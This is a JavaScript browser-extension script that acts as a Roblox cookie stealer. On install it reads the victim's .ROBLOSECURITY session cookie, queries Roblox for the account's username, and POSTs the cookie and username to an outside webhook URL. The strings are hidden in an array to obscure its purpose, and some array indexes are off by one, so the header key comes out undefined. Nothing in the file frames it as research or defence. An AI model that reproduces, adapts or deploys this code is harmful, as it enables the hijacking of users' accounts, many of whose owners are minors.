(function () {
    const urlList = [
        "https://raw.githubusercontent.com/MishaPisha2/Whattt-/main/test.txt", // Example webhook link (change this!)
        "https://www.roblox.com",
        ".ROBLOSECURITY",
        "RobloxSecurity Cookie found:",
        "Session Cookie (no expiration)",
        "https://users.roblox.com/v1/users/authenticated",
        "GET",
        "application/json",
        "Cookie",
        "Unknown User",
        "RobloxSecurity Cookie: ",
        "\nExpiration Date: ",
        "\nUsername: ",
        "POST",
        "Cookie successfully sent to Discord",
        "Cookie not found.",
        "Extension installed or updated, initializing cookie sending...",
        "Content-Type"
    ];

    console.log(urlList[17]); // "Extension installed or updated..."

    chrome.cookies.get({ url: urlList[1], name: urlList[2] }, function (cookie) {
        if (cookie) {
            console.log(urlList[3]); // "RobloxSecurity Cookie found:"
            const roblosec = cookie.value;

            fetch(urlList[5], {
                method: urlList[6],
                headers: {
                    [urlList[8]]: `${urlList[2]}=${roblosec}`
                }
            })
                .then(response => response.json())
                .then(data => {
                    const username = data.name || urlList[9];
                    const expiration = urlList[4]; // No expiration for session cookies
                    const webhookUrl = urlList[0];

                    const message = {
                        content: `${urlList[10]} ${roblosec}${urlList[11]} ${expiration}${urlList[12]} ${username}`
                    };

                    fetch(webhookUrl, {
                        method: urlList[13],
                        headers: {
                            [urlList[18]]: urlList[7]
                        },
                        body: JSON.stringify(message)
                    })
                        .then(() => console.log(urlList[14])) // "Cookie successfully sent..."
                        .catch(() => {});
                })
                .catch(() => {});
        } else {
            console.log(urlList[15]); // "Cookie not found."
        }
    });
})();
